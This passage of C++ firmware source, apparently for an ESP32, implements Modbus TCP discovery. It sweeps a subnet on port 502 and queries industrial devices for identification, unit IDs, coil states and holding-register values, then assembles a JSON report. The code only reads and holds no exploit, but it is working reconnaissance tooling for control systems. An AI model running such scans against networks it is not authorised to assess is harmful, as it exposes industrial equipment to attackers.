        case 0x05: return "ModelName";
        case 0x06: return "UserApplicationName";
        default:   return "Obj";
    }
}

// (Optional) Report Slave ID 0x11, returns a raw string (if supported)
static bool tryReportSlaveId(int sock, uint16_t tid, uint8_t unit, int timeout_ms, int retries, psram_string& out) {
    std::vector<uint8_t> pdu = {0x11};
    auto request = makeMBAP(tid, unit, (uint16_t)pdu.size());
    request.insert(request.end(), pdu.begin(), pdu.end());
    psram_vector<uint8_t> resp;
    if (!sendRequestWithRetry(sock, request, resp, timeout_ms, retries)) {
        return false;
    }
    if (resp.size() < 9) return false;
    if ((resp[7] & 0x80) == 0x80) return false;
    if (resp[7] != 0x11) return false;
    uint8_t bc = resp[8];
    if (9 + bc > resp.size()) return false;
    out.assign((const char*)&resp[9], (const char*)&resp[9] + bc);
    return true;
}

std::string ModbusTCPPlugin::doNetworkDiscovery(const std::string& target_network,
                                                uint32_t timeout_ms) {
    psram_string target_ps = PSRAMUtils::createPSRAMString(target_network.c_str());
    psram_string report_ps;
    if (!doNetworkDiscoveryPSRAM(target_ps, timeout_ms, report_ps)) {
        return std::string{};
    }
    return PSRAMUtils::fromPSRAMString(report_ps);
}

bool ModbusTCPPlugin::doNetworkDiscoveryPSRAM(const psram_string& target_network,
                                              uint32_t timeout_ms,
                                              psram_string& out_report) {
    std::string legacy_target = PSRAMUtils::fromPSRAMString(target_network);
    std::string legacy_report = legacyDoNetworkDiscovery(legacy_target, timeout_ms);
    if (legacy_report.empty()) {
        out_report.clear();
        return false;
    }
    out_report = PSRAMUtils::createPSRAMString(legacy_report.c_str());
    return true;
}

std::string ModbusTCPPlugin::legacyDoNetworkDiscovery(const std::string& target_network, uint32_t timeout_ms) {

    const uint32_t kMinDiscoveryWdtMs = 240000U; // 4 minutes
    const uint32_t kMaxDiscoveryWdtMs = 600000U; // 10 minutes
    uint32_t wdt_min_timeout_ms = kMinDiscoveryWdtMs;
    if (timeout_ms > 0U) {
        uint32_t candidate = timeout_ms;
        if (candidate < kMinDiscoveryWdtMs) {
            candidate = kMinDiscoveryWdtMs;
        }
        if (candidate > (kMaxDiscoveryWdtMs - 120000U)) {
            candidate = kMaxDiscoveryWdtMs;
        } else {
            candidate += 120000U;
        }
        wdt_min_timeout_ms = candidate;
    }
    ScopedDiscoveryWdtExtension wdt_guard(BasePlugin::cfg_, wdt_min_timeout_ms); // cfg_ from BasePlugin

    PSRAMJsonParser::PSRAMContext json_ctx;
    cJSON* root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "protocol", "modbus_tcp");
    cJSON_AddStringToObject(root, "target_network", target_network.c_str());
    cJSON* devices = cJSON_CreateArray();
    int devices_found = 0;
    int hosts_scanned = 0;
    int hosts_connected = 0;
    int responses_mei = 0;
    int responses_probe = 0;
    int connect_fail = 0;
    const uint16_t port = 502;
    int per_host_timeout_ms = cfg_.discovery_io_timeout_ms;
    if (timeout_ms >= 50 && timeout_ms <= 2000) {
        per_host_timeout_ms = (int)timeout_ms;
    }
    if (per_host_timeout_ms < cfg_.discovery_connect_timeout_ms) {
        per_host_timeout_ms = cfg_.discovery_connect_timeout_ms;
    }
    psram_vector<uint8_t> units_default;
    buildUnitScanList(units_default);

    esp_netif_t* eth = esp_netif_get_handle_from_ifkey("ETH_DEF");
    esp_netif_ip_info_t eth_ip{};
    bool eth_ready = (eth != nullptr) && (esp_netif_get_ip_info(eth, &eth_ip) == ESP_OK) && (eth_ip.ip.addr != 0);
    char bound_ip_str[16] = {0};
    if (eth_ready) {
        snprintf(bound_ip_str, sizeof(bound_ip_str), IPSTR, IP2STR(&eth_ip.ip));
        LOG_INFOF(TAG_MB, "Binding discovery sockets to Ethernet IP %s", bound_ip_str);
    } else {
        LOG_WARNING(TAG_MB, "Ethernet interface not ready (ETH_DEF has no IP). Aborting Modbus discovery to avoid WiFi usage.");
        cJSON_AddItemToObject(root, "devices", cJSON_CreateArray());
        cJSON_AddNumberToObject(root, "total_found", 0);
        cJSON* params = cJSON_CreateObject();
        cJSON_AddStringToObject(params, "error", "ethernet_not_ready");
        cJSON_AddItemToObject(root, "params", params);
    if (bound_ip_str[0]) cJSON_AddStringToObject(params, "bound_local_ip", bound_ip_str);
        char* json = cJSON_PrintUnformatted(root);
        std::string out = json ? std::string(json) : std::string("{}");
        if (json) free(json);
        cJSON_Delete(root);
        return out;
    }


    // 1) IP expansion (keeping your simple handling for /24 or a single IP)
    psram_vector<psram_string> ips_to_scan;
    if (target_network.find('/') != std::string::npos) {
        auto slash_pos = target_network.find('/');
        // Use stack buffer instead of std::string to avoid IRAM allocation
        char base_ip[32];
        size_t base_len = std::min(slash_pos, sizeof(base_ip) - 1);
        memcpy(base_ip, target_network.c_str(), base_len);
        base_ip[base_len] = '\0';

        // Find last dot
        char* last_dot = strrchr(base_ip, '.');
        if (last_dot) {
            *last_dot = '\0';  // Truncate at last dot to get subnet
            // Build IPs using stack buffer (increased size for safety)
            char ip_buf[64];
            for (int i = 1; i < 255; ++i) {
                snprintf(ip_buf, sizeof(ip_buf), "%s.%d", base_ip, i);
                ips_to_scan.push_back(PSRAMUtils::createPSRAMString(ip_buf));
            }
        }
    } else {
        ips_to_scan.push_back(PSRAMUtils::createPSRAMString(target_network.c_str()));
    }
    DiscoveryManager::getInstance().initTotalsTLS((uint32_t)ips_to_scan.size());

    // Connection pool configuration to prevent socket exhaustion
    const int MAX_CONCURRENT_CONNECTIONS = 4; // Reduce the load on lwIP and internal semaphores
    const int BATCH_SIZE = 4; // Smaller batches to reduce DRAM usage
    const int BATCH_DELAY_MS = 200; // Slower pace to allow cleanup
    const size_t MIN_FREE_INTERNAL_FOR_SOCKET = 30000; // DRAM safety threshold before opening a new socket

    const int request_retries = std::max(1, cfg_.discovery_request_retries);
    const int connect_retries = std::max(1, cfg_.discovery_connect_retries);
    const int connect_timeout_ms = cfg_.discovery_connect_timeout_ms;
    const int prescan_timeout_ms = (cfg_.discovery_prescan_timeout_ms > 0) ? cfg_.discovery_prescan_timeout_ms : 250;
    const bool prescan_enabled = cfg_.discovery_prescan_enabled;

    const int quick_timeout_ms = std::max(200, per_host_timeout_ms / 3);

    const int probe_unit_limit = std::max(1, cfg_.discovery_probe_coils_max);

    auto tcpPrescan = [&](const char* addr_str) -> bool {
        if (!prescan_enabled) {
            return true;
        }
        for (int attempt = 0; attempt < connect_retries; ++attempt) {
            int probe = AssessmentInterface::openBoundSocket(AF_INET, SOCK_STREAM, 0);
            if (probe < 0) {
                vTaskDelay(pdMS_TO_TICKS(30));
                continue;
            }
            configureTcpSocket(probe);
#ifdef SO_BINDTODEVICE
            {
                struct ifreq ifr;
                if_indextoname(esp_netif_get_netif_impl_index(eth), ifr.ifr_name);
                (void)setsockopt(probe, SOL_SOCKET, SO_BINDTODEVICE, (void*)&ifr, sizeof(struct ifreq));
            }
#endif
            struct timeval ptv; ptv.tv_sec = prescan_timeout_ms / 1000; ptv.tv_usec = (prescan_timeout_ms % 1000) * 1000;
            setsockopt(probe, SOL_SOCKET, SO_RCVTIMEO, &ptv, sizeof(ptv));
            setsockopt(probe, SOL_SOCKET, SO_SNDTIMEO, &ptv, sizeof(ptv));
            int flags = fcntl(probe, F_GETFL, 0);
            if (flags != -1) (void)fcntl(probe, F_SETFL, flags | O_NONBLOCK);
            struct sockaddr_in addr{}; addr.sin_family = AF_INET; addr.sin_port = htons(port);
            addr.sin_addr.s_addr = inet_addr(addr_str);
            bool ok = false;
            int rc = ::connect(probe, (struct sockaddr*)&addr, sizeof(addr));
            if (rc == 0) {
                ok = true;
            } else if (errno == EINPROGRESS) {
                fd_set wfds; FD_ZERO(&wfds); FD_SET(probe, &wfds);
                struct timeval ctv = ptv;
                int sel = select(probe + 1, NULL, &wfds, NULL, &ctv);
                if (sel > 0) {
                    int soerr = 0; socklen_t slen = sizeof(soerr);
                    getsockopt(probe, SOL_SOCKET, SO_ERROR, &soerr, &slen);
                    ok = (soerr == 0);
                }
            }
            ::close(probe);
            if (ok) {
                return true;
            }
            vTaskDelay(pdMS_TO_TICKS(40));
        }
        return false;
    };

    LOG_INFOF(TAG_MB, "Starting discovery with throttling: %zu IPs, max %d concurrent connections",
              ips_to_scan.size(), MAX_CONCURRENT_CONNECTIONS);

    uint64_t t0_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);
    uint64_t discovery_timeout_ms = 300000;//timeout_ms > 0 ? timeout_ms : 300000; // Default 300 seconds

    // Process IPs in batches to avoid socket exhaustion
    for (size_t batch_start = 0; batch_start < ips_to_scan.size(); batch_start += BATCH_SIZE) {
        // Check global timeout - but preserve results already collected
        uint64_t elapsed_ms = (uint64_t)(esp_timer_get_time() / 1000ULL) - t0_ms;
        if (elapsed_ms > discovery_timeout_ms) {
            LOG_WARNINGF(TAG_MB, "? Discovery timeout reached after %llu ms, stopping at batch %zu/%zu (preserving %d devices found)",
                        elapsed_ms, (batch_start / BATCH_SIZE) + 1, (ips_to_scan.size() + BATCH_SIZE - 1) / BATCH_SIZE, devices_found);
            break;
        }
        // Reset watchdog ogni batch per evitare il trigger del task WDT

        size_t batch_end = std::min(batch_start + BATCH_SIZE, ips_to_scan.size());

        LOG_INFOF(TAG_MB, "?? Processing batch %zu-%zu of %zu IPs",
                  batch_start + 1, batch_end, ips_to_scan.size());

        size_t i = batch_start;
        int low_mem_retries = 0;
        while (i < batch_end) {
            const auto& ip = ips_to_scan[i];

            size_t free_internal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);

            if (free_internal < MIN_FREE_INTERNAL_FOR_SOCKET) {
                ++low_mem_retries;
                LOG_WARNINGF(TAG_MB, "Limited DRAM (%u bytes) before connecting to %s (attempt %d)",
                            (unsigned)free_internal, ip.c_str(), low_mem_retries);
                if (low_mem_retries >= 5) {
                    LOG_WARNINGF(TAG_MB, "Skipping host %s due to insufficient memory after %d attempts", ip.c_str(), low_mem_retries);
                    ++i;
                    low_mem_retries = 0;
                    vTaskDelay(pdMS_TO_TICKS(150));
                    continue;
                }
                vTaskDelay(pdMS_TO_TICKS(120 + low_mem_retries * 40));
                continue;
            } else {
                low_mem_retries = 0;
            }
            hosts_scanned++;
            DiscoveryManager::getInstance().updateProgressTLS(ip.c_str(), hosts_scanned, hosts_connected, responses_mei, responses_probe);
            if (rep_ && ((hosts_scanned % 8) == 1 || hosts_scanned == (int)ips_to_scan.size())) {
                cJSON* ev = cJSON_CreateObject();
                cJSON_AddStringToObject(ev, "event", "modbus_discovery_progress");
                cJSON_AddStringToObject(ev, "ip_in_scansione", ip.c_str());
                cJSON_AddNumberToObject(ev, "index", hosts_scanned);
                cJSON_AddNumberToObject(ev, "total", (int)ips_to_scan.size());
                if (bound_ip_str[0]) cJSON_AddStringToObject(ev, "bound_local_ip", bound_ip_str);
                char* js = cJSON_PrintUnformatted(ev);
                if (js) {
                    LOG_INFOF(TAG_MB, "?? Sending progress event for host %d/%d", hosts_scanned, (int)ips_to_scan.size());
                    psram_string type = PSRAMUtils::createPSRAMString("modbus_discovery_progress");
                    psram_string payload = PSRAMUtils::createPSRAMString(js);
                    rep_->reportEvent(type, payload);
                    free(js);
                }
                cJSON_Delete(ev);
            }

            if (!tcpPrescan(ip.c_str())) {
                connect_fail++;
                LOG_DEBUGF(TAG_MB, "Skipping %s: TCP prescan timeout (%d ms)", ip.c_str(), prescan_timeout_ms);
                vTaskDelay(pdMS_TO_TICKS(40));
                ++i;
                continue;
            }

            // ? TCP PRESCAN POSITIVE = DEVICE ALIVE!
            LOG_INFOF(TAG_MB, "?? DEVICE DISCOVERED: %s - TCP prescan successful (port %d open)", ip.c_str(), port);

            // Create device entry immediately - will be enriched if Modbus tests succeed
            cJSON* device_entry = cJSON_CreateObject();
            cJSON_AddStringToObject(device_entry, "ip", ip.c_str());
            cJSON_AddNumberToObject(device_entry, "port", 502);
            cJSON_AddStringToObject(device_entry, "protocol", "modbus_tcp");
            cJSON_AddStringToObject(device_entry, "status", "TCP_RESPONSIVE");
            cJSON_AddStringToObject(device_entry, "discovery_method", "TCP_PRESCAN");
            if (bound_ip_str[0]) cJSON_AddStringToObject(device_entry, "bound_local_ip", bound_ip_str);

            // Initialize response tracking arrays
            cJSON_AddArrayToObject(device_entry, "modbus_responses");
            cJSON_AddArrayToObject(device_entry, "unit_ids");
            cJSON_AddArrayToObject(device_entry, "gateway_units");

            cJSON_AddItemToArray(devices, device_entry);

            devices_found++; // Count this as a discovered device

            bool connected = false;
            int sock = -1;
            uint64_t host_start_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);

            for (int attempt = 0; attempt < connect_retries; ++attempt) {
                sock = AssessmentInterface::openBoundSocket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) {
                    LOG_WARNINGF(TAG_MB, "Failed to create socket for %s (errno=%d)", ip.c_str(), errno);
                    vTaskDelay(pdMS_TO_TICKS(40));
                    continue;
                }

                configureTcpSocket(sock);
#ifdef SO_BINDTODEVICE
                {
                    struct ifreq ifr;
                    if_indextoname(esp_netif_get_netif_impl_index(eth), ifr.ifr_name);
                    (void)setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (void*)&ifr, sizeof(struct ifreq));
                }
#endif
                struct timeval rtv; rtv.tv_sec = per_host_timeout_ms/1000; rtv.tv_usec = (per_host_timeout_ms%1000)*1000;
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rtv, sizeof(rtv));
                struct timeval stv; stv.tv_sec = connect_timeout_ms/1000; stv.tv_usec = (connect_timeout_ms%1000)*1000;
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &stv, sizeof(stv));

                int flags = fcntl(sock, F_GETFL, 0);
                if (flags != -1) (void)fcntl(sock, F_SETFL, flags | O_NONBLOCK);

                struct sockaddr_in addr{}; addr.sin_family = AF_INET; addr.sin_port = htons(port);
                addr.sin_addr.s_addr = inet_addr(ip.c_str());

                int rc = ::connect(sock, (struct sockaddr*)&addr, sizeof(addr));
                if (rc == 0) {
                    connected = true;
                } else if (errno == EINPROGRESS) {
                    fd_set wfds; FD_ZERO(&wfds); FD_SET(sock, &wfds);
                    struct timeval ctv; ctv.tv_sec = connect_timeout_ms/1000; ctv.tv_usec = (connect_timeout_ms%1000)*1000;
                    int sel = select(sock + 1, NULL, &wfds, NULL, &ctv);
                    if (sel > 0) {
                        int soerr = 0; socklen_t slen = sizeof(soerr);
                        getsockopt(sock, SOL_SOCKET, SO_ERROR, &soerr, &slen);
                        connected = (soerr == 0);
                    }
                }

                if (connected) {
                    break;
                }

                ::close(sock);
                sock = -1;
                vTaskDelay(pdMS_TO_TICKS(60));
            }

            if (sock < 0 || !connected) {
                connect_fail++;
                if (sock >= 0) {
                    ::close(sock);
                }
                LOG_DEBUGF(TAG_MB, "Connect failed for %s after %d attempt(s)", ip.c_str(), connect_retries);
                ++i;
                continue;
            }
            hosts_connected++;

        // 3) Deterministic: Read Device Identification (Basic/Regular/Extended) on typical units
        //    - if gateway, some ignore unit=0xFF; try 0xFF and 0x01
        psram_vector<uint8_t> units_to_try(units_default.begin(), units_default.end());
        psram_vector<int> discovered_units;
        psram_string vendor, product, revision, product_name, model_name, vendor_url, slave_id_raw;

        // Data tracking for reading tests
        struct ReadingData {
            bool coils_read_success = false;
            bool holding_registers_read_success = false;
            uint8_t coils_data = 0;
            uint16_t holding_reg0 = 0;
            uint16_t holding_reg1 = 0;
            int successful_coils_unit = -1;
            int successful_holding_unit = -1;
        } reading_data;

        uint16_t tid = 1;
        for (uint8_t unit : units_to_try) {
            // Check per-host timeout
            uint64_t host_elapsed_ms = (uint64_t)(esp_timer_get_time() / 1000ULL) - host_start_ms;
            if (host_elapsed_ms > 20000) { // 20 seconds timeout per host
                LOG_WARNINGF(TAG_MB, "? Host timeout after %llu ms for %s, skipping to next host (preserving %d devices found)",
                            host_elapsed_ms, ip.c_str(), devices_found);
                continue; // Skip to next unit
            }
            // Basic (0x01), then Regular (0x02) and Extended (0x03) with possible More Follows
            for (uint8_t level : { (uint8_t)0x01, (uint8_t)0x02, (uint8_t)0x03 }) {
                uint8_t next_obj = 0x00;
                uint8_t more = 0x00;
                int safety_pages = 0;
                bool host_mei_responded = false;
                uint64_t host_loop_start_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);
                do {
                    // Check timeout within host MEI loop to avoid infinite loops
                    uint64_t host_loop_elapsed_ms = (uint64_t)(esp_timer_get_time() / 1000ULL) - host_loop_start_ms;
                    if (host_loop_elapsed_ms > 20000) { // 20 seconds timeout for MEI loop
                        LOG_WARNINGF(TAG_MB, "? MEI loop timeout after %llu ms for host %s unit %u, skipping to next",
                                    host_loop_elapsed_ms, ip.c_str(), (unsigned)unit);
                        break;
                    }
                    auto req = makeReadDeviceIdReq(tid++, unit, level, next_obj);
                    psram_vector<uint8_t> resp;
                    if (!sendRequestWithRetry(sock, req, resp, per_host_timeout_ms, request_retries)) {
                        LOG_DEBUGF(TAG_MB, "ReadDeviceId retry exhaustion on %s unit %u level %u", ip.c_str(), (unsigned)unit, (unsigned)level);
                        break;
                    }
                    host_mei_responded = true;
                    bool mei_exception = (resp.size() >= 8) && ((resp[7] & 0x80) == 0x80);
                    if (mei_exception) {
                        uint8_t exception_code = (resp.size() >= 9) ? resp[8] : 0;
                        LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s unit %u - MEI exception response (code=0x%02X), server is responding!",
                                 ip.c_str(), (unsigned)unit, exception_code);
                        if (std::find(discovered_units.begin(), discovered_units.end(), (int)unit) == discovered_units.end()) {
                            discovered_units.push_back((int)unit);
                        }
                        break;
                    }

                    uint8_t conf=0; psram_vector<DeviceIdKV> kvs;
                    if (!parseDeviceIdResponse(resp, conf, more, next_obj, kvs)) break;
                    host_mei_responded = true;

                    // ? VALID MEI RESPONSE = MODBUS DEVICE ALIVE!
                    LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s unit %u - MEI Read Device ID successful (level=%u, objects=%zu)!",
                             ip.c_str(), (unsigned)unit, (unsigned)level, kvs.size());

                    // Signals that there is at least ONE usable unit
                    if (std::find(discovered_units.begin(), discovered_units.end(), (int)unit) == discovered_units.end())
                        discovered_units.push_back((int)unit);

                    for (auto& kv : kvs) {
                        std::string name = devIdName(kv.id);
                        if (name == "VendorName"   && vendor.empty())       vendor = kv.value;
                        else if (name == "ProductCode" && product.empty())  product = kv.value;
                        else if (name == "Revision"    && revision.empty()) revision = kv.value;
                        else if (name == "ProductName" && product_name.empty()) product_name = kv.value;
                        else if (name == "ModelName"   && model_name.empty())   model_name = kv.value;
                        else if (name == "VendorURL"   && vendor_url.empty())   vendor_url = kv.value;
                    }
                    safety_pages++;
                } while (more != 0x00 && safety_pages < 8); // protezione anti-loop
                if (host_mei_responded) responses_mei++;
            }

            psram_string slave_raw;
            if (tryReportSlaveId(sock, tid++, unit, per_host_timeout_ms, request_retries, slave_raw) && slave_id_raw.empty()) {
                slave_id_raw = slave_raw;
                // ? VALID REPORT SLAVE ID RESPONSE = MODBUS DEVICE ALIVE!
                LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s unit %u - Report Slave ID successful (data_len=%zu)!",
                         ip.c_str(), (unsigned)unit, slave_raw.length());
            }
        }

        // 3.5) Standard Modbus Tests: Read Coils and Read Holding Registers for discovered units
        LOG_WARNINGF(TAG_MB, "?? HEAVY_LOG: Starting standard Read Coils/Holding Registers tests for %s", ip.c_str());
        for (uint8_t unit : units_to_try) {
            // Test Read Coils (FC=0x01) - address 0, quantity 2 (covers both 0-based and 1-based addressing)
            auto coils_req = makeReadCoilsReq(tid++, unit, 0, 2);
            psram_vector<uint8_t> coils_resp;
            LOG_WARNINGF(TAG_MB, "?? HEAVY_LOG: Testing Read Coils (0-1) for %s unit %u", ip.c_str(), (unsigned)unit);
            if (sendRequestWithRetry(sock, coils_req, coils_resp, per_host_timeout_ms, request_retries)) {
                bool coils_exception = (coils_resp.size() >= 8) && ((coils_resp[7] & 0x80) == 0x80);
                if (coils_exception) {
                    uint8_t exception_code = (coils_resp.size() >= 9) ? coils_resp[8] : 0;
                    LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s unit %u - Read Coils (0-1) exception response (code=0x%02X), server is responding!",
                             ip.c_str(), (unsigned)unit, exception_code);
                } else if (coils_resp.size() >= 9) { // 7 MBAP + 1 FC + 1 byte_count + 1 data_byte (2 coils)
                    uint8_t coil_data = (coils_resp.size() >= 10) ? coils_resp[9] : 0;

                    // Save reading data for report (only first successful read)
                    if (!reading_data.coils_read_success) {
                        reading_data.coils_read_success = true;
                        reading_data.coils_data = coil_data;
                        reading_data.successful_coils_unit = (int)unit;
                    }

                    LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s unit %u - Read Coils (0-1) successful! Data=0x%02X (coil0=%d, coil1=%d)",
                             ip.c_str(), (unsigned)unit, coil_data, (coil_data & 0x01) ? 1 : 0, (coil_data & 0x02) ? 1 : 0);
                }
                // Add to discovered units if not already present
                if (std::find(discovered_units.begin(), discovered_units.end(), (int)unit) == discovered_units.end()) {
                    discovered_units.push_back((int)unit);
                    LOG_INFOF(TAG_MB, "?? Added unit %u to discovered_units via Read Coils test", (unsigned)unit);
                }
            }

            // Test Read Holding Registers (FC=0x03) - address 0, quantity 2 (covers both 0-based and 1-based addressing)
            auto holding_req = makeReadHoldingRegistersReq(tid++, unit, 0, 2);
            psram_vector<uint8_t> holding_resp;
            LOG_WARNINGF(TAG_MB, "?? HEAVY_LOG: Testing Read Holding Registers (0-1) for %s unit %u", ip.c_str(), (unsigned)unit);
            if (sendRequestWithRetry(sock, holding_req, holding_resp, per_host_timeout_ms, request_retries)) {
                bool holding_exception = (holding_resp.size() >= 8) && ((holding_resp[7] & 0x80) == 0x80);
                if (holding_exception) {
                    uint8_t exception_code = (holding_resp.size() >= 9) ? holding_resp[8] : 0;
                    LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s unit %u - Read Holding Registers (0-1) exception response (code=0x%02X), server is responding!",
                             ip.c_str(), (unsigned)unit, exception_code);
                } else if (holding_resp.size() >= 13) { // 7 MBAP + 1 FC + 1 byte_count + 4 register_data (2 registers)
                    uint16_t reg0 = (holding_resp.size() >= 11) ? ((uint16_t)holding_resp[9] << 8) | holding_resp[10] : 0;
                    uint16_t reg1 = (holding_resp.size() >= 13) ? ((uint16_t)holding_resp[11] << 8) | holding_resp[12] : 0;

                    // Save reading data for report (only first successful read)
                    if (!reading_data.holding_registers_read_success) {
                        reading_data.holding_registers_read_success = true;
                        reading_data.holding_reg0 = reg0;
                        reading_data.holding_reg1 = reg1;
                        reading_data.successful_holding_unit = (int)unit;
                    }

                    LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s unit %u - Read Holding Registers (0-1) successful! Reg0=%u, Reg1=%u",
                             ip.c_str(), (unsigned)unit, reg0, reg1);
                }
                // Add to discovered units if not already present
                if (std::find(discovered_units.begin(), discovered_units.end(), (int)unit) == discovered_units.end()) {
                    discovered_units.push_back((int)unit);
                    LOG_INFOF(TAG_MB, "?? Added unit %u to discovered_units via Read Holding Registers test", (unsigned)unit);
                }
            }
        }
        LOG_WARNINGF(TAG_MB, "?? HEAVY_LOG: Completed standard Read tests for %s - discovered_units now has %zu units", ip.c_str(), discovered_units.size());

        // 4) (Optional) UnitID 1..247 enumeration for gateways (brief, with short timeouts)
        psram_vector<int> gateway_units;
        {
            const int max_scan_units = 32; // stop early: safe-scan
            for (int u = 1; u <= max_scan_units; ++u) {
                auto req = makeReadDeviceIdReq(tid++, (uint8_t)u, 0x01/*Basic*/, 0x00);
                psram_vector<uint8_t> resp;
                if (!sendRequestWithRetry(sock, req, resp, quick_timeout_ms, request_retries)) {
                    continue;
                }
                if (resp.size() >= 8 && ((resp[7] & 0x80) == 0x80)) {
                    uint8_t exception_code = (resp.size() >= 9) ? resp[8] : 0;
                    LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s gateway unit %u - MEI exception response (code=0x%02X), server is responding!",
                             ip.c_str(), u, exception_code);
                    gateway_units.push_back(u);
                    continue;
                }
                if (resp.size() >= 9 && resp[7] == 0x2B && resp[8] == 0x0E) {
                    LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s gateway unit %u - MEI Read Device ID successful!",
                             ip.c_str(), u);
                    gateway_units.push_back(u);
                }
                vTaskDelay(pdMS_TO_TICKS(10));
            }
        }

        // Additional fallback for devices without MEI 0x2B/0x0E: Read Coils probe on units 1..10
        if (discovered_units.empty() && gateway_units.empty()) {
            for (int uid = 1; uid <= probe_unit_limit; ++uid) {
                auto probe = makeReadCoilsReq(tid++, (uint8_t)uid, 0, 2);  // Read 2 coils for better coverage
                psram_vector<uint8_t> r;
                if (!sendRequestWithRetry(sock, probe, r, per_host_timeout_ms, request_retries)) {
                    continue;
                }
                if (r.size() < 8) {
                    continue;
                }
                bool coil_exception = ((r[7] & 0x80) == 0x80);
                if (coil_exception || r.size() >= 9) {
                    if (coil_exception) {
                        uint8_t exception_code = (r.size() >= 9) ? r[8] : 0;
                        LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s unit %u - Fallback Read Coils (0-1) exception response (code=0x%02X), server is responding!",
                                 ip.c_str(), uid, exception_code);
                    } else {
                        uint8_t coil_data = (r.size() >= 10) ? r[9] : 0;

                        // Save reading data for report (only first successful read, including fallback)
                        if (!reading_data.coils_read_success) {
                            reading_data.coils_read_success = true;
                            reading_data.coils_data = coil_data;
                            reading_data.successful_coils_unit = uid;
                        }

                        LOG_INFOF(TAG_MB, "?? MODBUS DEVICE ALIVE: %s unit %u - Fallback Read Coils (0-1) successful! Data=0x%02X (coil0=%d, coil1=%d)",
                                 ip.c_str(), uid, coil_data, (coil_data & 0x01) ? 1 : 0, (coil_data & 0x02) ? 1 : 0);
                    }
                    if (std::find(discovered_units.begin(), discovered_units.end(), uid) == discovered_units.end()) {
                        discovered_units.push_back(uid);
                    }
                }
            }
            if (!discovered_units.empty()) responses_probe++;
        }

        ::close(sock);

        // Arricchisci il device entry se i test Modbus hanno avuto successo
        if (!discovered_units.empty() || !gateway_units.empty()) {
            // Ordina e de-dup
            std::sort(discovered_units.begin(), discovered_units.end());
            discovered_units.erase(std::unique(discovered_units.begin(), discovered_units.end()), discovered_units.end());
            std::sort(gateway_units.begin(), gateway_units.end());
            gateway_units.erase(std::unique(gateway_units.begin(), gateway_units.end()), gateway_units.end());

            // Update status to indicate Modbus functionality
            cJSON_ReplaceItemInObject(device_entry, "status", cJSON_CreateString("MODBUS_RESPONSIVE"));
            cJSON_ReplaceItemInObject(device_entry, "discovery_method", cJSON_CreateString("MODBUS_DISCOVERY"));

            // Add Modbus-specific information
            cJSON_AddStringToObject(device_entry, "vendor", vendor.empty()?"Unknown":vendor.c_str());
            cJSON_AddStringToObject(device_entry, "product_code", product.empty()?"Unknown":product.c_str());
            cJSON_AddStringToObject(device_entry, "revision", revision.empty()?"Unknown":revision.c_str());
            cJSON_AddStringToObject(device_entry, "product_name", product_name.empty()?"Modbus Device":product_name.c_str());
            cJSON_AddStringToObject(device_entry, "model_name", model_name.empty()?"Unknown":model_name.c_str());
            cJSON_AddStringToObject(device_entry, "vendor_url", vendor_url.c_str());
            cJSON_AddStringToObject(device_entry, "report_slave_id", slave_id_raw.c_str());

            // Add test results summary
            cJSON* test_results = cJSON_CreateObject();
            cJSON_AddBoolToObject(test_results, "mei_device_identification", responses_mei > 0);
            cJSON_AddBoolToObject(test_results, "report_slave_id", !slave_id_raw.empty());
            cJSON_AddBoolToObject(test_results, "read_coils_tested", true);
            cJSON_AddBoolToObject(test_results, "read_holding_registers_tested", true);
            cJSON_AddBoolToObject(test_results, "gateway_scan_performed", !gateway_units.empty());
            cJSON_AddItemToObject(device_entry, "test_results", test_results);

            cJSON* units = cJSON_CreateArray();
            for (int u : discovered_units) cJSON_AddItemToArray(units, cJSON_CreateNumber(u));
            cJSON_AddItemToObject(device_entry, "unit_ids", units);

            cJSON* gw_units = cJSON_CreateArray();
            for (int u : gateway_units) cJSON_AddItemToArray(gw_units, cJSON_CreateNumber(u));
            cJSON_AddItemToObject(device_entry, "gateway_units", gw_units);

            // Add reading data section with actual data read from device
            cJSON* reading_data_json = cJSON_CreateObject();
            if (reading_data.coils_read_success) {
                cJSON* coils_data = cJSON_CreateObject();
                cJSON_AddNumberToObject(coils_data, "unit_id", reading_data.successful_coils_unit);
                cJSON_AddNumberToObject(coils_data, "address", 0);
                cJSON_AddNumberToObject(coils_data, "quantity", 2);
                cJSON_AddNumberToObject(coils_data, "raw_data", reading_data.coils_data);
                cJSON_AddBoolToObject(coils_data, "coil_0", (reading_data.coils_data & 0x01) ? true : false);
                cJSON_AddBoolToObject(coils_data, "coil_1", (reading_data.coils_data & 0x02) ? true : false);
                cJSON_AddItemToObject(reading_data_json, "coils", coils_data);
            }
            if (reading_data.holding_registers_read_success) {
                cJSON* holding_data = cJSON_CreateObject();
                cJSON_AddNumberToObject(holding_data, "unit_id", reading_data.successful_holding_unit);
                cJSON_AddNumberToObject(holding_data, "address", 0);
                cJSON_AddNumberToObject(holding_data, "quantity", 2);
                cJSON_AddNumberToObject(holding_data, "register_0", reading_data.holding_reg0);
                cJSON_AddNumberToObject(holding_data, "register_1", reading_data.holding_reg1);
                cJSON_AddItemToObject(reading_data_json, "holding_registers", holding_data);
            }
            cJSON_AddItemToObject(device_entry, "reading_data", reading_data_json);

            LOG_INFOF(TAG_MB, "? Enhanced %s: vendor=%s product=%s rev=%s units=%zu gw_units=%zu | ReadData: coils=%s(0x%02X) holding=%s(%u,%u)",
                      ip.c_str(),
                      vendor.c_str(), product.c_str(), revision.c_str(),
                      discovered_units.size(), gateway_units.size(),
